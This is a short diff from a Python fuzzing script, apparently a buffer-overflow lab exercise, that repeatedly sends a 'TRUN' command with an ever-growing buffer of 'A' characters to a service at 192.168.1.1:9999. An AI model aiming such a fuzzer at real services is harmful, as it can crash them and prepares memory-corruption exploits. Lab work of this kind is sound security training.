@@ -10,3 +10,5 @@ while True:
 		s.connect(('192.168.1.1', 9999))
 		s.send(('TRUN /.:/' + buffer))
 		s.close()
+		sleep(1)
+		buffer = buffer + "A"*100
